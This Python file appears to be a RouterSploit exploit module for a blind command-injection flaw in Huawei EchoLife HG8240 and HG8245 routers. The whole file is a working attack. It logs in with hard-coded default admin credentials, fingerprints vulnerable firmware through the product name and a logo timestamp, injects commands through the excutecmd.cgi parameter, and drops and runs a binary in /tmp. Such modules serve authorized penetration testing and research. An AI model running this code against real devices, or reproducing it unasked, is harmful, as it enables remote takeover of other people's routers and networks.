import base64
import re
import time
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Huawei HG824* Authenticate Command Injection",
        "description": "Module exploits Huawei HG824* Remote Code Execution "
                       "vulnerability which allows executing command on the device.",
        "authors": (
            "GH0st3rs",  # vulnerability discovery
            "GH0st3rs",  # routersploit module
        ),
        "references": ( ),
        "devices": (
            "Huawei EchoLife HG8240 V1",
            "Huawei EchoLife HG8245 V1",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    username = OptString("telecomadmin", "Username to log in with")
    password = OptString("admintelecom", "Password to log in with")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Try login to device...")
            if self.login():
                print_success("Login success...")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available")
            shell(self, architecture="armle", method="echo",
                  location="/tmp", echo_options={"max_length": 10},
                  exec_binary="chmod 777 {0} && {0} && rm {0}")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def login(self):
        encoded_pwd = base64.b64encode(self.password.encode()).decode()
        headers = {
            "Cookie": f"Cookie=UserName:{self.username}:PassWord:{encoded_pwd}:Language:english:id=1"
        }

        response = self.http_request(
            method="GET",
            path="/login.cgi",
            headers=headers,
        )

        if response is not None and response.headers.get("Set-cookie"):
            return True
        return False

    def execute(self, cmd: str) -> str:
        encoded_pwd = base64.b64encode(self.password.encode()).decode()
        headers = {
            "Cookie": f"Cookie=UserName:{self.username}:PassWord:{encoded_pwd}:Language:english:id=1"
        }

        self.http_request(
            method="GET",
            path=f"/excutecmd.cgi?cmd={cmd}&RequestFile=index.asp",
            headers=headers,
        )

        return ""

    @ mute
    def check(self):
        # Check device model
        response = self.http_request(
            method="GET",
            path="/",
        )
        if response is None:
            return False  # target is not vulnerable
        if response.status_code == 200:
            ProductName = re.findall(r"ProductName = '([\w]+)';", response.text)
            if len(ProductName) == 0 or ProductName[0] not in ['HG8240', 'HG8245']:
                return False  # target is not vulnerable

        # Check specified url
        response = self.http_request(
            method="GET",
            path="/images/logo.gif",
        )
        if response is None:
            return False  # target is not vulnerable
        if response.status_code == 200 and response.headers.get("Last-Modified"):
            # Examle Thu, 17 May 2012 13:17:50 GMT
            time_stamp = response.headers.get("Last-Modified").split(' GMT')[0]
            parsed_time = time.strptime(time_stamp, '%a, %d %b %Y %H:%M:%S')
            if parsed_time.tm_year != 1970 and parsed_time.tm_mon != 1:
                return True  # target is vulnerable

        return False  # target not vulnerable
